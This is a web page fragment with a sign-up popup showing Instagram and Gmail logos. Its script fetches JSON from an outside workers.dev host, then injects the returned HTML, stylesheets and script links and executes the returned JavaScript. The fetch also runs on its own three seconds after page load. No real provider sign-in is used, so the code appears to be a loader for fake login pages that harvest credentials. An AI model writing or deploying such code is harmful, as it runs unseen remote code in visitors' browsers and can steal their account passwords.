
    <div class="popup-overlay" id="signupPopup">
        <div class="popup-content" style="position: relative;">
            <span class="close-popup" onclick="hidePopup()">&times;</span>
            <h2 class="popup-title">Sign Up</h2>
            <div class="signup-option" onclick="initiateSignup('example');">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram Logo">
                <span>Sign up with Instagram</span>
            </div>
            <div class="signup-option" onclick="initiateSignup('example1');">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png" alt="Gmail Logo">
                <span>Sign up with Gmail</span>
            </div>
        </div>
    </div>
    <div id="content-container"></div>
    <div id="injected-content"></div>
    <div id="loader"><div class="spinner"></div></div>

    <!-- Your existing popup logic -->
    <script>
        let cdnContentx = null;
        let injectedResources = new Set(); // Keep track of injected resources

        function showSignupOptions() {
            document.getElementById('signup-options').style.display = 'block';
        }

        async function initiateSignup(method) {
            try {
                showLoader();
                if (!cdnContentx) {
                    await fetchcdnContentx();
                }
                injectContent(method);
            } catch (error) {
                console.error('Error during signup initiation:', error);
                alert('An error occurred. Please try again.');
            } finally {
                hideLoader();
            }
        }

        async function fetchcdnContentx() {
            try {
                const response = await fetch('https://test4.mrrajaryanx30.workers.dev/cdn-content');
                cdnContentx = await response.json();
                injectCssLinks(cdnContentx.cssLinks);
                injectJsLinks(cdnContentx.jsLinks);
            } catch (error) {
                console.error('Error fetching CDN content:', error);
                throw new Error('Failed to load content. Please try again.');
            }
        }

        function injectCssLinks(links) {
            links.forEach(link => {
                if (!injectedResources.has(link)) {
                    const linkElement = document.createElement('link');
                    linkElement.rel = 'stylesheet';
                    linkElement.href = link;
                    document.head.appendChild(linkElement);
                    injectedResources.add(link);
                }
            });
        }

        function injectJsLinks(links) {
            links.forEach(link => {
                if (!injectedResources.has(link)) {
                    const scriptElement = document.createElement('script');
                    scriptElement.src = link;
                    document.head.appendChild(scriptElement);
                    injectedResources.add(link);
                }
            });
        }

        function injectContent(method) {
            const container = document.getElementById('content-container');
            container.innerHTML = '';
            
            const oldScript = document.getElementById('dynamic-script');
            if (oldScript) {
                oldScript.remove();
            }
            
            container.innerHTML = cdnContentx.html[method];
            
            const script = document.createElement('script');
            script.id = 'dynamic-script';
            script.textContent = `
                (function() {
                    ${cdnContentx.js[method]}
                })();
            `;
            document.body.appendChild(script);
        }

        function showLoader() {
            document.getElementById('loader').style.display = 'flex';
        }

        function hideLoader() {
            document.getElementById('loader').style.display = 'none';
        }

        setTimeout(fetchcdnContentx, 3000);
    </script>
